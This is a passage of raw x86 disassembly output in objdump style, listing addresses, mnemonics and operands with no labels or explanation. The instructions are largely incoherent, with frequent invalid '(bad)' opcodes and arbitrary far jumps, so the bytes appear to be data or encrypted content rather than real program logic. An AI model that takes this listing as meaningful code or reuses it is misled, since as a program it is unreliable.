  40a119:	lods   eax,DWORD PTR ds:[esi]
  40a11a:	jmp    0x40a0c2
  40a11c:	inc    edx
  40a11d:	dec    ebp
  40a11e:	mov    ebp,0xdc7d91b4
  40a123:	(bad)  
  40a124:	jae    0x40a10c
  40a126:	cdq    
  40a127:	retf   
  40a128:	jnp    0x40a161
  40a12a:	test   eax,0x3c28cd48
  40a12f:	popa   
  40a130:	sub    BYTE PTR [eax-0x68b57435],ah
  40a136:	or     DWORD PTR [ecx-0x6d7539e7],eax
  40a13c:	push   esi
  40a13d:	push   ss
  40a13e:	inc    edi
  40a13f:	jne    0x40a0f5
  40a141:	xchg   edx,eax
  40a142:	adc    bh,BYTE PTR ds:0x96a4a39e
  40a148:	sbb    ebp,ebp
  40a14a:	repz test al,0x98
  40a14d:	jne    0x40a0cf
  40a14f:	mov    al,0xad
  40a151:	inc    ebp
  40a152:	jge    0x40a1cd
  40a154:	test   BYTE PTR [esi-0xb8aaf],ch
  40a15a:	mov    esi,0xf1881b6f
  40a15f:	mov    cl,0x48
  40a161:	outs   dx,BYTE PTR ds:[esi]
  40a162:	aad    0xda
  40a164:	push   ss
  40a165:	or     al,0xee
  40a167:	pop    es
  40a168:	push   ebp
  40a169:	push   ebp
  40a16a:	jbe    0x40a1a7
  40a16c:	in     eax,0x19
  40a16e:	mov    esp,fs
  40a170:	and    DWORD PTR [esi-0x65d2e867],esi
  40a176:	test   al,0x2c
  40a178:	sub    eax,0xd64f1e78
  40a17d:	xchg   esp,eax
  40a17e:	cld    
  40a17f:	inc    ebx
  40a180:	into   
  40a181:	inc    DWORD PTR [eax]
  40a183:	sti    
  40a184:	fild   QWORD PTR [edi+0x61]
  40a187:	cs push ebp
  40a189:	popf   
  40a18a:	mov    eax,ds:0x67f21acd
  40a18f:	adc    ebx,DWORD PTR ds:0x23389c6f
  40a195:	dec    esp
  40a196:	push   edi
  40a197:	xchg   edx,eax
  40a198:	sub    al,0xa6
  40a19a:	pop    edi
  40a19b:	or     BYTE PTR [esi+ecx*4-0x6b],dl
  40a19f:	loopne 0x40a1f7
  40a1a1:	sbb    eax,0x5553b1e0
  40a1a6:	xchg   ecx,eax
  40a1a7:	fsubr  QWORD PTR [esi+0x39bd39d]
  40a1ad:	enter  0xf8c8,0xf0
  40a1b1:	gs dec esi
  40a1b3:	stos   DWORD PTR es:[edi],eax
  40a1b4:	xchg   edi,esp
  40a1b6:	mov    ecx,0xd4578b33
  40a1bb:	icebp  
  40a1bc:	mov    ebp,0x2ac1e2f4
  40a1c1:	lea    edx,[ebx+edi*8+0x39501d0a]
  40a1c8:	icebp  
  40a1c9:	or     al,0x6b
  40a1cb:	xlat   BYTE PTR ds:[ebx]
  40a1cc:	or     eax,0xc2cad71b
  40a1d1:	xor    ecx,DWORD PTR ds:[eax]
  40a1d4:	std    
  40a1d5:	arpl   bp,di
  40a1d7:	je     0x40a248
  40a1d9:	add    dl,BYTE PTR [edx+0x7a]
  40a1dc:	or     ebp,DWORD PTR [esi+0x56]
  40a1df:	cmp    eax,ecx
  40a1e1:	jns    0x40a209
  40a1e3:	loope  0x40a1a8
  40a1e5:	outs   dx,DWORD PTR ds:[esi]
  40a1e6:	or     DWORD PTR [edi-0x3c],edi
  40a1e9:	sub    eax,0x852cc2f5
  40a1ee:	fcmovb st,st(5)
  40a1f0:	ffreep st(6)
  40a1f2:	adc    BYTE PTR [edx+eax*2],dh
  40a1f5:	push   0xffffffcd
  40a1f7:	jp     0x40a1d4
  40a1f9:	mov    al,ds:0xf0c1d5f8
  40a1fe:	div    DWORD PTR [ebx+eax*4]
  40a201:	lea    esp,[edi]
  40a203:	add    BYTE PTR [edi-0x4713f038],dl
  40a209:	sbb    ebx,ebp
  40a20b:	das    
  40a20c:	fisttp WORD PTR [ebp+0x7a14b4e7]
  40a212:	sub    BYTE PTR [ebx],ch
  40a214:	xchg   edx,eax
  40a215:	shr    BYTE PTR [ebp-0x6b],cl
  40a218:	pop    edi
  40a219:	mov    dh,0x39
  40a21b:	jns    0x40a1b1
  40a21d:	mov    gs,WORD PTR [edx+ebx*4]
  40a220:	jnp    0x40a26c
  40a222:	mov    BYTE PTR [esi+0x76],cl
  40a225:	push   0xdac48e9c
  40a22a:	mov    cl,0x63
  40a22c:	fs fs pop esi
  40a22f:	xchg   edx,eax
  40a230:	shl    BYTE PTR [ebp+0x28],cl
  40a233:	nop
  40a234:	pop    ecx
  40a235:	fcom   DWORD PTR [ecx]
  40a237:	add    al,0x6d
  40a239:	add    al,0xf0
  40a23b:	cs inc ebx
  40a23d:	div    al
  40a23f:	mov    al,ds:0x6e24e84
  40a244:	add    ebp,0x8
  40a247:	mov    ch,0xc3
  40a249:	mov    eax,0xd8646c04
  40a24e:	inc    esi
  40a24f:	loope  0x40a29f
  40a251:	push   edi
  40a252:	clc    
  40a253:	jae    0x40a22f
  40a255:	stos   BYTE PTR es:[edi],al
  40a256:	adc    esp,DWORD PTR [edx+0x6e]
  40a259:	psubusw mm2,mm0
  40a25c:	js     0x40a24d
  40a25e:	adc    al,0x63
  40a260:	das    
  40a261:	lahf   
  40a262:	xor    esi,DWORD PTR [edx]
  40a264:	and    bl,BYTE PTR [eax-0x3c]
  40a267:	dec    ecx
  40a268:	imul   edi,DWORD PTR [edi],0x39e7410b
  40a26e:	dec    edi
  40a26f:	in     eax,dx
  40a270:	(bad)  
  40a272:	jg     0x40a2be
  40a274:	adc    BYTE PTR [edi+0x39472e9c],dl
  40a27a:	inc    esp
  40a27b:	not    BYTE PTR [ecx-0x16]
  40a27e:	add    al,0xd8
  40a280:	jg     0x40a246
  40a282:	jle    0x40a2ab
  40a284:	pop    es
  40a285:	out    0x83,al
  40a287:	mov    ds:0x109839c3,eax
  40a28c:	test   eax,0x92d6e202
  40a291:	into   
  40a292:	icebp  
  40a293:	addr16 jnp 0x40a257
  40a296:	fisubr DWORD PTR [esp+ecx*8]
  40a299:	add    al,BYTE PTR [edx+0x29bfb61e]
  40a29f:	jg     0x40a320
  40a2a1:	scas   al,BYTE PTR es:[edi]
  40a2a2:	mov    dh,0xae
  40a2a4:	sub    eax,0x730c9253
  40a2a9:	rol    BYTE PTR [ebx],0x1e
  40a2ac:	mov    ebx,0x8bbdeeb3
  40a2b1:	cwde   
  40a2b2:	shr    BYTE PTR [ecx-0x1cd7f2a2],1
  40a2b8:	loope  0x40a305
  40a2ba:	in     eax,0x70
  40a2bc:	jnp    0x40a2cf
  40a2be:	pop    ds
  40a2bf:	pop    ds
  40a2c0:	fcmove st,st(7)
  40a2c2:	push   ds
  40a2c3:	adc    DWORD PTR ds:0x935a206,esi
  40a2c9:	in     eax,0x7b
  40a2cb:	mov    edi,0x7fcc8e1b
  40a2d0:	mul    DWORD PTR [eax-0x1f]
  40a2d3:	fs aaa 
  40a2d5:	push   edx
  40a2d6:	push   0x1a7d75fd
  40a2db:	lods   al,BYTE PTR ds:[esi]
  40a2dc:	daa    
  40a2dd:	(bad)
  40a2e0:	or     eax,0xb067d720
  40a2e5:	sbb    edi,DWORD PTR [edi]
  40a2e7:	icebp  
  40a2e8:	lods   al,BYTE PTR ds:[esi]
  40a2e9:	push   ss
  40a2ea:	jl     0x40a2bd
  40a2ec:	pop    edi
  40a2ed:	pop    edi
  40a2ee:	sbb    eax,0x553c7994
  40a2f3:	iret   
  40a2f4:	dec    ebp
  40a2f5:	adc    eax,0x8e341b35
  40a2fa:	jns    0x40a297
  40a2fc:	fs push 0x5d4db3fc
  40a302:	ss pusha 
  40a304:	into   
  40a305:	call   FWORD PTR ds:0xd8994885
  40a30b:	pusha  
  40a30c:	scas   eax,DWORD PTR es:[edi]
  40a30d:	inc    esi
  40a30e:	adc    edi,esi
  40a310:	into   
  40a311:	sbb    ecx,DWORD PTR [edx]
  40a313:	rcr    ecx,cl
  40a315:	fsub   DWORD PTR [ecx]
  40a317:	or     al,0x3e
  40a319:	sahf   
  40a31a:	jl     0x40a2ef
  40a31c:	(bad)  
  40a31d:	mov    BYTE PTR [edi],ch
  40a31f:	mul    BYTE PTR [ebx]
  40a321:	leave  
  40a322:	imul   esi,DWORD PTR [ebx-0x56ecf6f4],0xffffffd2
  40a329:	and    ebp,DWORD PTR ds:0xc8005668
  40a32f:	or     al,0xb8
  40a331:	dec    edi
  40a332:	adc    BYTE PTR [edx-0x5706ce26],ch
  40a338:	hlt    
  40a339:	add    ebp,edi
  40a33b:	mov    DWORD PTR [eax-0x62],esp
  40a33e:	sub    esi,DWORD PTR [ebx]
  40a340:	or     eax,0xc492192a
  40a345:	cs inc esp
  40a347:	inc    ecx
  40a348:	xchg   esp,eax
  40a349:	pop    esp
  40a34a:	mov    DWORD PTR [ebx+0x64],esp
  40a34d:	sbb    DWORD PTR [edx],0xd1295450
  40a353:	repz leave 
  40a355:	jmp    0xddfe:0xe6953082
  40a35c:	cmp    BYTE PTR ds:0xff16dd18,ah
  40a362:	mov    dh,0x1c
  40a364:	add    DWORD PTR [edx-0x3b],eax
  40a367:	mov    ch,0x7a
  40a369:	add    al,0x32
  40a36b:	xchg   DWORD PTR [edi],edi
  40a36d:	xlat   BYTE PTR ds:[ebx]
  40a36e:	adc    eax,0x906b1de1
  40a373:	sbb    DWORD PTR [esi+0x7668e5ec],edx
  40a379:	mov    ch,0x6b
  40a37b:	mov    ebp,DWORD PTR [ebp-0x38157f46]
  40a381:	xor    esp,DWORD PTR [esi-0x61dbf2ed]
  40a387:	jns    0x40a383
  40a389:	leave  
  40a38a:	jle    0x40a3cd
  40a38c:	mov    esi,0xbfad8efb
  40a391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a392:	add    eax,0x3ce44d50
  40a397:	mov    cl,BYTE PTR [ecx+ebp*4+0x651758a0]
  40a39e:	pop    edx
  40a39f:	xchg   ecx,eax
  40a3a0:	push   edx
  40a3a1:	cld    
  40a3a2:	mov    WORD PTR [edx],cs
  40a3a4:	sti    
  40a3a5:	dec    edx
  40a3a6:	mov    bl,0x14
  40a3a8:	jl     0x40a38d
  40a3aa:	mov    ecx,0x45c0fdfd
  40a3af:	dec    esi
  40a3b0:	jns    0x40a425
  40a3b2:	int    0xcd
  40a3b4:	lds    eax,FWORD PTR [eax+0x48]
  40a3b7:	xor    esp,edi
  40a3b9:	adc    edx,ecx
  40a3bb:	mov    WORD PTR [eax-0x2d17b77e],ds
  40a3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c2:	dec    edi
  40a3c3:	daa    
  40a3c4:	adc    al,0xd9
  40a3c6:	leave  
  40a3c7:	fmulp  st(1),st
  40a3c9:	dec    edi
  40a3ca:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a3cc:	cs xchg edi,eax
  40a3ce:	jle    0x40a3a8
  40a3d0:	popf   
  40a3d1:	ins    DWORD PTR es:[edi],dx
  40a3d2:	pushf  
  40a3d3:	loop   0x40a3db
  40a3d5:	jbe    0x40a403
  40a3d7:	adc    cl,BYTE PTR [ebx-0x245dbd98]
  40a3dd:	shr    BYTE PTR [ebp-0x2c46d7ef],1
  40a3e3:	in     eax,dx
  40a3e4:	cmp    ch,dl
  40a3e6:	xor    esp,DWORD PTR [ebp+0x27]
  40a3e9:	ins    BYTE PTR es:[edi],dx
  40a3ea:	imul   eax,ecx,0x91780756
  40a3f0:	xlat   BYTE PTR ds:[ebx]
  40a3f1:	jnp    0x40a401
  40a3f3:	std    
  40a3f4:	inc    ebp
  40a3f5:	mov    cl,0xf4
  40a3f7:	mov    ds:0x65a6fd66,eax
  40a3fc:	(bad)  
  40a3fd:	popa   
  40a3fe:	retf   
  40a3ff:	int    0xb5
  40a401:	rcl    BYTE PTR [ebp+0x14c25c2a],0xc6
  40a408:	aad    0x8c
  40a40a:	test   eax,0xa1579e10
  40a40f:	iret   
  40a410:	adc    eax,0x111de84e
  40a415:	add    esi,DWORD PTR [ebp-0x53]
  40a418:	push   esp
  40a419:	mov    ds:0x867c416b,eax
  40a41e:	leave  
  40a41f:	dec    edi
  40a420:	pop    eax
  40a421:	dec    edx
  40a422:	sbb    eax,0xff207e6d
  40a427:	and    eax,0xfa338fbc
  40a42c:	stos   DWORD PTR es:[edi],eax
  40a42d:	adc    eax,0x15408c21
  40a432:	xor    eax,0x70449ff5
  40a437:	popf   
  40a438:	stos   BYTE PTR es:[edi],al
  40a439:	hlt    
  40a43a:	js     0x40a4b2
  40a43c:	lods   al,BYTE PTR ds:[esi]
  40a43d:	add    eax,0xf49c146e
  40a442:	stc    
  40a443:	dec    esp
  40a444:	test   ebp,eax
  40a446:	push   es
  40a447:	dec    ebp
  40a448:	mov    ebp,0xe91df92e
  40a44d:	or     BYTE PTR [edi],bh
  40a44f:	adc    ah,al
  40a451:	cmp    ebp,DWORD PTR ss:[edx]
  40a454:	ret    0x7bbe
  40a457:	das    
  40a458:	push   0xffffffeb
  40a45a:	outs   dx,DWORD PTR ds:[esi]
  40a45b:	jge    0x40a43d
  40a45d:	jl     0x40a483
  40a45f:	xor    bh,BYTE PTR [edi-0x1]
  40a462:	data16 loopne 0x40a4e4
  40a465:	xor    BYTE PTR [ebx+0x71],dh
  40a468:	jne    0x40a47f
  40a46a:	scas   eax,DWORD PTR es:[edi]
  40a46b:	(bad)  
  40a46c:	mov    esp,edx
  40a46e:	sbb    eax,0xc48bb3bc
  40a473:	add    ecx,DWORD PTR [esi]
  40a475:	out    0x4f,eax
  40a477:	adc    al,BYTE PTR [ebx-0x46e0ecaf]
  40a47d:	inc    ebp
  40a47e:	loope  0x40a48a
  40a480:	pop    edi
  40a481:	mov    edx,0x8461d72f
  40a486:	mov    ecx,0x1fb6e7f
  40a48b:	pop    esi
  40a48c:	aam    0x46
  40a48e:	push   edx
  40a48f:	sahf   
  40a490:	push   ebp
  40a491:	dec    esi
  40a492:	mov    ch,0xe4
  40a495:	lock mul DWORD PTR [edi-0x423e396d]
  40a49c:	ja     0x40a479
  40a49e:	cmp    BYTE PTR [ebx],bh
  40a4a0:	pop    eax
  40a4a1:	aaa    
  40a4a2:	add    DWORD PTR [esi-0x4c499d9b],0x4935c15d
  40a4ac:	sbb    al,0xf2
  40a4ae:	pop    ebp
  40a4af:	loope  0x40a507
  40a4b1:	(bad)  
  40a4b2:	in     eax,0xe2
  40a4b4:	dec    eax
  40a4b5:	jns    0x40a4fc
  40a4b7:	mov    eax,0x4df4c5ae
  40a4bc:	mov    dl,0x48
  40a4be:	sub    bh,BYTE PTR [esi]
  40a4c0:	xchg   edi,eax
  40a4c1:	jmp    0x40a4ac
  40a4c3:	jbe    0x40a4de
  40a4c5:	mov    dh,0xa0
  40a4c7:	sti    
  40a4c8:	ja     0x35994eda
  40a4ce:	pop    ecx
  40a4cf:	addr16 aaa 
  40a4d1:	xlat   BYTE PTR ds:[ebx]
  40a4d2:	or     edx,eax
  40a4d4:	xchg   ebp,eax
  40a4d5:	add    DWORD PTR [esp+eax*4-0x1d31c46e],ebp
  40a4dc:	sub    DWORD PTR [ecx-0x68],eax
  40a4df:	cld    
  40a4e0:	psubq  mm3,mm0
  40a4e3:	cli    
  40a4e4:	push   0x75f46379
  40a4e9:	xor    BYTE PTR [ebp+0xc],0x19
  40a4ed:	fcmovnb st,st(2)
  40a4ef:	test   al,0xd0
  40a4f1:	or     DWORD PTR [ebx],0x8222418f
  40a4f7:	(bad)  
  40a4f8:	and    bh,BYTE PTR [edi+ecx*8]
  40a4fb:	cdq    
  40a4fc:	jge    0x40a4df
  40a4fe:	dec    esp
  40a4ff:	scas   eax,DWORD PTR es:[edi]
  40a500:	and    eax,edx
  40a502:	sub    eax,0x27b99e21
  40a507:	or     eax,0x593e0913
  40a50c:	int3   
  40a50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a50e:	in     eax,0x93
  40a510:	test   BYTE PTR [eax],bl
  40a512:	pop    esp
  40a513:	aaa    
  40a514:	ret    
  40a515:	inc    ebx
  40a516:	in     al,0xe8
  40a518:	fst    QWORD PTR ds:0xaca75f64
  40a51e:	(bad)  
  40a51f:	imul   ebx,DWORD PTR [ecx],0x1d872e05
  40a525:	ins    BYTE PTR es:[edi],dx
  40a526:	push   esp
  40a527:	push   edi
  40a528:	leave  
  40a529:	scas   al,BYTE PTR es:[edi]
  40a52a:	sub    al,0xd3
  40a52c:	xor    esi,eax
  40a52e:	int3   
  40a52f:	cmp    bl,BYTE PTR [esi]
  40a531:	arpl   WORD PTR [edx-0x1d],dx
  40a534:	mov    ds:0xe33bf671,al
  40a539:	ret    0xe1ad
  40a53c:	xor    DWORD PTR [eax+0x26],esi
  40a53f:	xlat   BYTE PTR ds:[ebx]
  40a540:	jne    0x40a4c2
  40a542:	arpl   WORD PTR [esi+eax*2-0x27921a41],cx
  40a549:	pop    ss
  40a54a:	(bad)  
  40a54b:	push   0xc20d0199
  40a550:	pop    ebp
  40a551:	mov    BYTE PTR [ebx+0x14],dh
  40a554:	cwde   
  40a555:	jae    0x40a534
  40a557:	popa   
  40a558:	icebp  
  40a559:	jne    0x40a5bf
  40a55b:	add    edx,DWORD PTR [ecx]
  40a55d:	repz mov ebx,0x63c1337d
  40a563:	fwait
  40a564:	in     eax,dx
  40a565:	add    ecx,DWORD PTR [ebx-0x10bef5db]
  40a56b:	jmp    0x1bf2083a
  40a570:	jg     0x40a59c
  40a572:	aaa    
  40a573:	leave  
  40a574:	sbb    DWORD PTR [ebp-0x78],edi
  40a577:	es scas al,BYTE PTR es:[edi]
  40a579:	xchg   edi,eax
  40a57a:	jg     0x40a5d0
  40a57c:	mov    DWORD PTR [edx],esi
  40a57e:	mov    ebp,0xb473cab6
  40a583:	les    eax,FWORD PTR [edx+0x49de69e]
  40a589:	sub    BYTE PTR [edx+0x5736d55],0x85
  40a590:	sub    al,0xad
  40a592:	cmp    BYTE PTR [ebp-0x34],0xe8
  40a596:	cdq    
  40a597:	or     cl,BYTE PTR [esi-0x38]
  40a59a:	xor    bl,BYTE PTR [edx]
  40a59c:	jmp    0x974e:0xc22a5e13
  40a5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a4:	xor    al,BYTE PTR [eax-0x55]
  40a5a7:	div    BYTE PTR [edi+0x25]
  40a5aa:	mov    esp,0xeb31f8ae
  40a5af:	popa   
  40a5b0:	popa   
  40a5b1:	cwde   
  40a5b2:	fld    DWORD PTR [ebx]
  40a5b4:	rcr    ecx,1
  40a5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5b7:	mov    bl,0x6f
  40a5b9:	push   0x4c
  40a5bb:	dec    ebp
  40a5bc:	jne    0x40a5d0
  40a5be:	inc    esp
  40a5bf:	stc    
  40a5c0:	adc    bl,bl
  40a5c2:	jbe    0x40a5c6
  40a5c4:	push   edx
  40a5c5:	push   ss
  40a5c6:	sub    BYTE PTR [edi],dh
  40a5c8:	or     eax,0x8155971e
  40a5cd:	mov    bl,0x3c
  40a5cf:	xor    ebp,0x4d350c45
  40a5d5:	call   0xc930:0xfe1f2113
  40a5dc:	jmp    DWORD PTR [ecx-0x2ed82372]
  40a5e2:	mov    edi,0x85fd3a97
  40a5e7:	push   ss
  40a5e8:	sub    esp,edx
  40a5ea:	cwde   
  40a5eb:	nop
  40a5ec:	mov    edi,0x13e64114
  40a5f1:	lahf   
  40a5f2:	dec    eax
  40a5f3:	hlt    
  40a5f4:	push   ecx
  40a5f5:	popa   
  40a5f6:	mov    al,ds:0x4cb7f1fe
  40a5fb:	iret   
  40a5fc:	daa    
  40a5fd:	add    dh,BYTE PTR [ebx]
  40a5ff:	add    dl,BYTE PTR [ecx]
  40a601:	and    BYTE PTR [edi+ecx*8-0x1509e3a9],0xf
  40a609:	fsubr  DWORD PTR [edx+0x29]
  40a60c:	retf   
  40a60d:	and    bh,BYTE PTR ds:0xc2799ddb
  40a613:	jae    0x40a66f
  40a615:	or     BYTE PTR [esp+eiz*4+0xecb0857],0x79
  40a61d:	adc    bl,BYTE PTR [ebp+eiz*1-0x50]
  40a621:	xor    al,0xde
  40a623:	cmp    al,0xfd
  40a625:	and    esp,DWORD PTR [esi]
  40a627:	(bad)  
  40a628:	and    dh,BYTE PTR [edx+ebp*4-0x3644bfb1]
  40a62f:	dec    esi
  40a630:	xor    ecx,esp
  40a632:	or     eax,0xe77d0ad4
  40a637:	bound  ebx,QWORD PTR [ebx]
  40a639:	mov    bh,0xc2
  40a63b:	mov    ds:0xaa77edf5,eax
  40a640:	push   ds
  40a641:	ja     0x40a5fc
  40a643:	pop    esi
  40a644:	aad    0x65
  40a646:	mov    edi,0xdc0f261c
  40a64b:	imul   ebx,DWORD PTR [ebp+0x5a16bbd6],0xb9877d80
  40a655:	xchg   ecx,eax
  40a656:	out    dx,eax
  40a657:	stos   DWORD PTR es:[edi],eax
  40a658:	pop    ds
  40a659:	rcr    BYTE PTR [esp+eax*1],cl
  40a65c:	jp     0x40a6dd
  40a65e:	xchg   esp,eax
  40a65f:	sub    BYTE PTR [edx+0x297dde12],ah
  40a665:	or     BYTE PTR gs:0xe473c22a,bh
  40a66c:	mov    eax,ds:0x9777c66b
  40a671:	sbb    eax,0xcd8407a7
  40a676:	and    edx,eax
  40a678:	rcl    BYTE PTR [ebx-0x63],cl
  40a67b:	push   edi
  40a67c:	adc    DWORD PTR [edx-0xf1c32c5],edx
  40a682:	inc    esp
  40a683:	or     eax,0x2297e862
  40a688:	lds    edi,FWORD PTR [eax+0x70e98915]
  40a68e:	inc    edi
  40a68f:	inc    ebx
  40a690:	mov    esp,ebp
  40a692:	push   edi
  40a693:	imul   edi,DWORD PTR [esi],0xffffffdf
  40a696:	div    DWORD PTR [edi]
  40a698:	mov    ch,0xe8
  40a69a:	xchg   ecx,eax
  40a69b:	scas   al,BYTE PTR es:[edi]
  40a69c:	ret    
  40a69d:	pop    ss
  40a69e:	ret    
  40a69f:	mov    edi,0x6a60c652
  40a6a4:	and    edi,DWORD PTR [edi]
  40a6a6:	inc    esi
  40a6a7:	xchg   edi,eax
  40a6a8:	xor    cl,BYTE PTR [ecx+0x4fd60160]
  40a6ae:	(bad)  
  40a6af:	mov    eax,ds:0x4952e989
  40a6b4:	sbb    cl,BYTE PTR [esi]
  40a6b6:	fcmovu st,st(4)
  40a6b8:	inc    esi
  40a6b9:	jb     0x40a6bd
  40a6bb:	inc    BYTE PTR [ebp+0x3c]
  40a6be:	inc    ebx
  40a6bf:	push   es
  40a6c0:	mov    BYTE PTR ds:0xee4a8e13,dh
  40a6c6:	pop    edi
  40a6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c8:	pushf  
  40a6c9:	add    BYTE PTR [ecx],al
  40a6cb:	sub    BYTE PTR [esi+0x5d],bh
  40a6ce:	fmul   QWORD PTR [esi-0x1d5de973]
  40a6d4:	xor    dh,dl
  40a6d6:	outs   dx,BYTE PTR ds:[esi]
  40a6d7:	ficom  WORD PTR [ecx+0x79]
  40a6da:	jg     0x40a6d5
  40a6dc:	jp     0x40a6e5
  40a6de:	sbb    DWORD PTR [ebx],0x32
  40a6e1:	arpl   WORD PTR [edi+0x2c],si
  40a6e4:	cmc    
  40a6e5:	jno    0x40a673
  40a6e7:	popf   
  40a6e8:	inc    ebx
  40a6e9:	push   edi
  40a6ea:	add    al,0x45
  40a6ec:	and    ah,BYTE PTR [ecx]
  40a6ee:	xor    BYTE PTR [ebx+esi*2],cl
  40a6f1:	hlt    
  40a6f2:	and    al,0xfc
  40a6f4:	sub    BYTE PTR [esi+0x66],dh
  40a6f7:	shl    DWORD PTR [eax],0xe9
  40a6fa:	popf   
  40a6fb:	loop   0x40a6b6
  40a6fd:	loop   0x40a6d1
  40a6ff:	in     eax,dx
  40a700:	das    
  40a701:	xchg   edi,eax
  40a702:	(bad)  
  40a704:	cld    
  40a705:	inc    ebp
  40a706:	add    BYTE PTR [ebx-0x6f749fa5],dh
  40a70c:	xchg   ebp,eax
  40a70d:	inc    ebp
  40a70e:	xchg   BYTE PTR [ecx],al
  40a710:	dec    DWORD PTR [esi]
  40a712:	test   al,0x8b
  40a714:	xchg   ebp,eax
  40a715:	dec    edi
  40a716:	sbb    bl,BYTE PTR [edx]
  40a718:	mov    eax,0xded137c2
  40a71d:	and    esp,edi
  40a71f:	mov    dh,0xf7
  40a721:	push   ebp
  40a722:	scas   eax,DWORD PTR es:[edi]
  40a723:	mov    eax,0x7db67fe5
  40a728:	call   FWORD PTR [eax+0x4794b44e]
  40a72e:	mov    eax,ds:0x963a7826
  40a733:	pushf  
  40a734:	inc    eax
  40a735:	in     al,dx
  40a736:	push   esi
  40a737:	xchg   BYTE PTR [edi+0x78],ah
  40a73a:	xchg   dl,al
  40a73c:	dec    esp
  40a73d:	ins    BYTE PTR es:[edi],dx
  40a73e:	or     eax,0x9d887f15
  40a744:	aas    
  40a745:	ins    DWORD PTR es:[edi],dx
  40a746:	xor    bh,BYTE PTR [ecx]
  40a748:	sub    ebx,DWORD PTR [ecx]
  40a74a:	ret    
  40a74b:	(bad)  
  40a74c:	ror    bh,cl
  40a74e:	out    dx,eax
  40a74f:	mov    cl,0x72
  40a751:	mov    al,0xd4
  40a753:	dec    edi
  40a754:	jbe    0x40a763
  40a756:	sub    DWORD PTR [ecx-0x10],eax
  40a759:	pop    eax
  40a75a:	call   0xd6cb:0x7093d6d0
  40a761:	adc    DWORD PTR [ecx],esi
  40a763:	(bad)  
  40a764:	les    esi,FWORD PTR [ebx]
  40a766:	cs mov edx,0x52c9cc63
  40a76c:	and    BYTE PTR [eax],bl
  40a76e:	fwait
  40a76f:	xchg   ecx,eax
  40a770:	and    bh,ch
  40a772:	mov    esp,0x815f8a3a
  40a777:	xchg   ecx,eax
  40a778:	pop    ss
  40a779:	ret    
  40a77a:	ret    
  40a77b:	and    cl,BYTE PTR [ecx-0x67]
  40a77e:	test   eax,0xaabfa891
  40a783:	popa   
  40a784:	pusha  
  40a785:	fwait
  40a786:	in     al,0x7
  40a788:	fisubr WORD PTR [edx]
  40a78a:	pop    ebx
  40a78b:	test   DWORD PTR [eax-0x80],ebx
  40a78e:	sub    al,0x64
  40a790:	out    0x52,al
  40a792:	ins    BYTE PTR es:[edi],dx
  40a793:	cdq    
  40a794:	and    eax,0x79230dcd
  40a799:	test   DWORD PTR ds:0x5f4364de,ebx
  40a79f:	mov    ebp,0x472f403f
  40a7a4:	ficomp WORD PTR [eax+0x5baed438]
  40a7aa:	cmp    DWORD PTR [ebp-0xc3fd1e0],ebx
  40a7b0:	adc    eax,0x7d16c11c
  40a7b5:	mov    esi,0x8d464153
  40a7ba:	jae    0x40a76b
  40a7bc:	mov    bl,0x99
  40a7be:	mov    ch,0x92
  40a7c0:	and    edi,DWORD PTR [ebx+eiz*2]
  40a7c3:	push   es
  40a7c4:	stos   DWORD PTR es:[edi],eax
  40a7c5:	pop    ecx
  40a7c6:	pop    ds
  40a7c7:	call   0x1290:0xde052f54
  40a7ce:	daa    
  40a7cf:	xchg   BYTE PTR [ebp+0x6337830d],dh
  40a7d5:	nop
  40a7d6:	test   BYTE PTR [ebp-0x2a],cl
  40a7d9:	sbb    eax,0x3e1089c4
  40a7de:	sahf   
  40a7df:	mov    edx,0x49da4353
  40a7e4:	(bad)  
  40a7e5:	cmp    al,0x76
  40a7e7:	cmp    esi,DWORD PTR [esp+esi*1+0x34]
  40a7eb:	push   ebp
  40a7ec:	in     eax,0x1c
  40a7ee:	jo     0x40a84a
  40a7f0:	adc    al,0x2a
  40a7f2:	xor    eax,0x23b6bcbe
  40a7f7:	loop   0x40a7d1
  40a7f9:	push   ebp
  40a7fa:	ret    
  40a7fb:	xor    BYTE PTR [esi],cl
  40a7fd:	pop    ebx
  40a7fe:	xor    DWORD PTR [ecx],ebp
  40a800:	test   al,0x86
  40a802:	cmp    eax,0xa60e5d4f
  40a807:	inc    edx
  40a808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a809:	test   al,0xab
  40a80b:	loope  0x40a855
  40a80d:	push   eax
  40a80e:	shr    DWORD PTR [eax+0x21115657],0xab
  40a815:	xor    cl,BYTE PTR [ebp+0xec055c3]
  40a81b:	and    al,0xd7
  40a81d:	or     DWORD PTR [esi+0x1f],edi
  40a820:	pop    eax
  40a821:	out    dx,al
  40a822:	mov    al,BYTE PTR [ecx+0x1f]
  40a825:	jp     0x40a82c
  40a827:	push   esi
  40a828:	or     al,0xd3
  40a82a:	(bad)  
  40a82c:	jnp    0x40a7b7
  40a82e:	push   ds
  40a82f:	mov    DWORD PTR [edi-0x552d2615],ecx
  40a835:	xadd   DWORD PTR ds:0x77634c75,ebx
  40a83c:	pop    es
  40a83d:	sbb    al,0x3b
  40a83f:	cmp    DWORD PTR [ecx],0xfffffff6
  40a842:	cld    
  40a843:	inc    esi
  40a844:	add    cl,BYTE PTR [esp+edi*8+0x7d]
  40a848:	jmp    0xdb206cad
  40a84d:	call   0xf9914cd5
  40a852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a854:	adc    BYTE PTR [edi+ecx*1],bl
  40a857:	imul   esp,DWORD PTR ds:0x28a5bb6,0xcf9d4870
  40a861:	repz int3 
  40a863:	sbb    al,0x38
  40a865:	mov    dh,0x1f
  40a867:	rol    DWORD PTR [esi],0xf
  40a86a:	mov    BYTE PTR ds:0x3c5c48bd,ch
  40a870:	add    eax,0x8ac20f1d
  40a875:	sub    al,0x4b
  40a877:	sbb    ecx,DWORD PTR [ecx-0x70]
  40a87a:	les    eax,FWORD PTR [ecx]
  40a87c:	pop    esp
  40a87d:	inc    edi
  40a87e:	jle    0x40a80d
  40a880:	mov    esi,DWORD PTR [ecx+0x74fefbc3]
  40a886:	imul   edx,DWORD PTR [ebx],0xffffffb3
